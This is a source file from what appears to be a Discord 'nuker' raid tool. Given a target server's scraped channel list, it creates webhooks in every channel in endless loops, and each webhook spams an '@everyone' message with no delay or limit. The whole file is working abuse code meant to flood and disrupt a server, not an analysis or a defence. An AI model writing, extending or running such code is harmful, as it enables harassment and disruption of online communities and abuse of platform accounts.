import { createString } from "../../utils/createString";
import scrapeModel from "../../models/scrape";
import { wizz } from "../wizz";
import { getTheme } from "../../utils/getTheme";
import { white } from "chalk";

module.exports = async (client, rl, db, guildID) => {
  rl.question(createString("Enter webhook name", db), async (webhookName) => {
    rl.question(
      createString("Enter webhook message", db),
      async (webhookMsg) => {
        function nukeStr(str, type) {
          let mainColor = getTheme(db);
          let r = `              ${mainColor("[")}${white(
            type === "rateLimit"
              ? "!"
              : type === "success"
              ? "+"
              : type === "fail"
              ? "-"
              : ""
          )}${mainColor("]")} ${white(str)}`;
          return r;
        }
        let scrape = <unknown>await scrapeModel.findOne({
          Username: db.get("username"),
          Guild: guildID,
        });
        let server = client.guilds.cache.get(guildID);
        if (!scrape) {
          console.log(
            createString("No scrape data for the server", db, "semi", "fail")
          );
          setTimeout(() => {
            wizz(client, db, rl);
          }, 1000);
          return;
        }
        interface chs {
          Channels: String[];
        }
        let scraper = <chs>scrape;
        let mainColor = getTheme(db);
        let c = 1;
        webhookMsg = `@everyone ${webhookMsg}`;
        scraper.Channels.map(async (ch) => {
          // let inter = setInterval(() => {
          //   if (c >= scraper.Channels.length) {
          //     setTimeout(() => {
          //       wizz(client, db, rl);
          //     }, 1000);
          //     clearInterval(inter);
          //   }
          // }, 1000);
          let channel = server.channels.cache.get(ch);
          if (!channel) return;
          setInterval(async () => {
            (await channel.fetch())
              .createWebhook(webhookName)
              .then((web) => {
                process.title = `[External-Nuker] - Created webhook ${web.id}`;
                c++;
                console.log(
                  nukeStr(`Created webhook ${mainColor(web.id)}`, "success")
                );
                setInterval(() => {
                  web
                    .send(webhookMsg)
                    .then((m) => {
                      process.title = `[External-Nuker] - Sent webhook message ${m.id}`;
                      console.log(
                        nukeStr(`Sent webhook message ${m.id}`, "success")
                      );
                    })
                    .catch(() => {
                      process.title = `[External-Nuker] - Failed to send webhook message`;
                      console.log(
                        nukeStr(`Failed to send webhook message`, "fail")
                      );
                    });
                });
              })
              .catch(() => {
                process.title = `[External-Nuker] - Failed to create webhook`;
                c++;
                console.log(nukeStr(`Failed to create webhook`, "fail"));
              });
          });
        });
      }
    );
  });
};
